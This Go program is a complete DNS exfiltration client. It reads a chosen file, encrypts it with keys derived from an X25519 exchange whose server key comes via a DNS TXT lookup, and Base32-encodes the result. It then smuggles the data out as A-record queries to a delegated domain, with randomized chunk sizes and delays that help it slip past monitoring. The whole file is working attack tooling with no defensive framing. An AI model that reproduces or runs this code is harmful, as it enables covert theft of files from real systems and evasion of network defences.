package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base32"
	"flag"
	"fmt"
	"io"
	"log"
	"math"
	mrand "math/rand"
	"os"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/joho/godotenv"
	"github.com/miekg/dns"
	"golang.org/x/crypto/hkdf"
)

const (
	maxRetries   = 3
	minChunkSize = 16
	maxLabelLen  = 52
)

// rng for pseudo-random chunk sizes and delays
var rng = mrand.New(mrand.NewSource(time.Now().UnixNano()))

// config holds CLI flags
type config struct {
	ServerIP   string
	ServerPort int
	FilePath   string
	Domain     string
	LowMs      int
	HighMs     int
}

func main() {
	// Load environment variables (optional .env)
	_ = godotenv.Load()

	// Parse CLI flags
	cfg := parseFlags()
	serverAddr := fmt.Sprintf("%s:%d", cfg.ServerIP, cfg.ServerPort)

	// Session identifier
	id := uuid.New().String()[:8]
	log.Printf("Session ID: %s", id)

	// Fetch server's public key via DNS TXT
	serverPub, err := fetchServerPubkey(cfg.Domain, serverAddr)
	if err != nil {
		log.Fatalf("fetch server public key: %v", err)
	}

	// Perform ECDH handshake and derive AES/HMAC keys
	aesKey, hmacKey, err := performKeyExchange(id, serverPub, cfg, serverAddr)
	if err != nil {
		log.Fatalf("key exchange failed: %v", err)
	}
	log.Printf("Keys established for session %s", id)

	// Encrypt file + HMAC tag
	blob, err := encryptAndHMAC(cfg.FilePath, aesKey, hmacKey)
	if err != nil {
		log.Fatalf("encryption failed: %v", err)
	}
	// Base32 encode and strip padding
	b32 := base32.StdEncoding.EncodeToString(blob)
	b32 = strings.TrimRight(b32, "=")
	log.Printf("Base32 length: %d", len(b32))

	// Chunk into DNS-safe labels
	segments, err := chunkPayload(b32, id, minChunkSize, maxLabelLen)
	if err != nil {
		log.Fatalf("chunking payload: %v", err)
	}

	// Send each segment with randomized delays and retries
	var failures []string
	for _, seg := range segments {
		time.Sleep(time.Duration(rng.Intn(cfg.HighMs-cfg.LowMs+1)+cfg.LowMs) * time.Millisecond)
		if err := reliableSend(seg, cfg, serverAddr); err != nil {
			failures = append(failures, seg)
		}
	}

	if len(failures) > 0 {
		log.Fatalf("failed to send %d segments", len(failures))
	}
	log.Println("All segments sent successfully")
}

// parseFlags parses command-line flags into config

func parseFlags() *config {
	cfg := &config{}
	flag.StringVar(&cfg.ServerIP, "server-ip", "127.0.0.1", "DNS server IP")
	flag.IntVar(&cfg.ServerPort, "server-port", 5300, "DNS server port")
	flag.StringVar(&cfg.FilePath, "file-path", "", "Path to file to exfiltrate")
	flag.StringVar(&cfg.Domain, "domain", "xf.example.com", "Delegated DNS domain")
	flag.IntVar(&cfg.LowMs, "low", 500, "Min delay (ms) between queries")
	flag.IntVar(&cfg.HighMs, "high", 1000, "Max delay (ms) between queries")
	flag.Parse()
	if cfg.FilePath == "" {
		flag.Usage()
		os.Exit(1)
	}
	return cfg
}

// fetchServerPubkey retrieves the server public key via a TXT query
func fetchServerPubkey(domain, serverAddr string) ([]byte, error) {
	fqdn := fmt.Sprintf("public.%s.", domain)
	msg := new(dns.Msg)
	msg.SetQuestion(fqdn, dns.TypeTXT)
	client := &dns.Client{Timeout: 2 * time.Second}

	resp, _, err := client.Exchange(msg, serverAddr)
	if err != nil {
		return nil, fmt.Errorf("DNS query failed: %w", err)
	}
	for _, ans := range resp.Answer {
		if t, ok := ans.(*dns.TXT); ok {
			txt := strings.Join(t.Txt, "")
			pad := (8 - len(txt)%8) % 8
			txt += strings.Repeat("=", pad)
			return base32.StdEncoding.DecodeString(txt)
		}
	}
	return nil, fmt.Errorf("no TXT record for %s", fqdn)
}

// performKeyExchange sends the client's ephemeral pubkey in 50-char fragments
// and derives shared AES+HMAC keys.
func performKeyExchange(id string, serverPub []byte, cfg *config, serverAddr string) ([]byte, []byte, error) {
	curve := ecdh.X25519()
	clientPriv, err := curve.GenerateKey(rand.Reader)
	if err != nil {
		return nil, nil, err
	}
	pubBytes := clientPriv.PublicKey().Bytes()
	b32Pub := strings.TrimRight(base32.StdEncoding.EncodeToString(pubBytes), "=")

	// Split into 50-char fragments
	var frags []string
	for i := 0; i < len(b32Pub); i += 50 {
		end := i + 50
		if end > len(b32Pub) {
			end = len(b32Pub)
		}
		frags = append(frags, b32Pub[i:end])
	}

	// Send each fragment
	for _, frag := range frags {
		label := fmt.Sprintf("%s-0-0-%s", id, frag)
		if err := reliableSend(label, cfg, serverAddr); err != nil {
			return nil, nil, fmt.Errorf("sending key fragment: %w", err)
		}
	}

	// Derive shared
	return deriveSharedKeys(clientPriv, serverPub)
}

// deriveSharedKeys performs ECDH and HKDF to split 48 bytes into AES+HMAC keys
func deriveSharedKeys(priv *ecdh.PrivateKey, serverPub []byte) ([]byte, []byte, error) {
	pubKey, err := ecdh.X25519().NewPublicKey(serverPub)
	if err != nil {
		return nil, nil, err
	}
	shared, err := priv.ECDH(pubKey)
	if err != nil {
		return nil, nil, err
	}
	hkdfReader := hkdf.New(sha256.New, shared, nil, []byte("dns-exfil"))
	material := make([]byte, 48)
	if _, err := io.ReadFull(hkdfReader, material); err != nil {
		return nil, nil, fmt.Errorf("hkdf expansion: %w", err)
	}
	return material[:32], material[32:], nil
}

// encryptAndHMAC reads file, encrypts with AES-GCM, appends HMAC-SHA256 tag
func encryptAndHMAC(path string, aesKey, hmacKey []byte) ([]byte, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	cipherText := gcm.Seal(nil, nonce, data, nil)
	mac := hmac.New(sha256.New, hmacKey)
	mac.Write(nonce)
	mac.Write(cipherText)
	tag := mac.Sum(nil)
	return append(append(nonce, cipherText...), tag...), nil
}

// chunkPayload splits a Base32 string into labels with randomized sizes
func chunkPayload(b32, id string, minSize, maxLabel int) ([]string, error) {
	estSeg := int(math.Ceil(float64(len(b32)) / float64(minSize)))
	totDigits := len(fmt.Sprintf("%d", estSeg))
	var segments []string
	pos := 0
	for idx := 0; pos < len(b32); idx++ {
		idxDigits := len(fmt.Sprintf("%d", idx))
		overhead := len(id) + idxDigits + totDigits + 3
		avail := maxLabel - overhead
		if avail < minSize {
			return nil, fmt.Errorf("maxLabel %d too small for minSize %d", maxLabel, minSize)
		}

		remaining := len(b32) - pos
		var size int
		if remaining <= minSize {
			size = remaining
		} else {
			maxChunk := avail
			if remaining < avail {
				maxChunk = remaining
			}
			size = rng.Intn(maxChunk-minSize+1) + minSize
		}

		segments = append(segments, b32[pos:pos+size])
		pos += size
	}

	// Format labels
	labels := make([]string, len(segments))
	total := len(segments)
	for i, seg := range segments {
		labels[i] = fmt.Sprintf("%s-%d-%d-%s", id, i, total, seg)
	}
	return labels, nil
}

// sendQuery sends a single DNS A query for label
func sendQuery(label string, cfg *config, serverAddr string) error {
	fqdn := fmt.Sprintf("%s.%s.", label, cfg.Domain)
	msg := new(dns.Msg)
	msg.SetQuestion(fqdn, dns.TypeA)
	client := &dns.Client{Timeout: 2 * time.Second}
	_, _, err := client.Exchange(msg, serverAddr)
	return err
}

// reliableSend retries sendQuery up to maxRetries
func reliableSend(label string, cfg *config, serverAddr string) error {
	for i := 1; i <= maxRetries; i++ {
		if err := sendQuery(label, cfg, serverAddr); err == nil {
			log.Printf("Sent %s", label)
			return nil
		}
		log.Printf("Retry %d for %s", i, label)
	}
	return fmt.Errorf("all retries failed for %s", label)
}
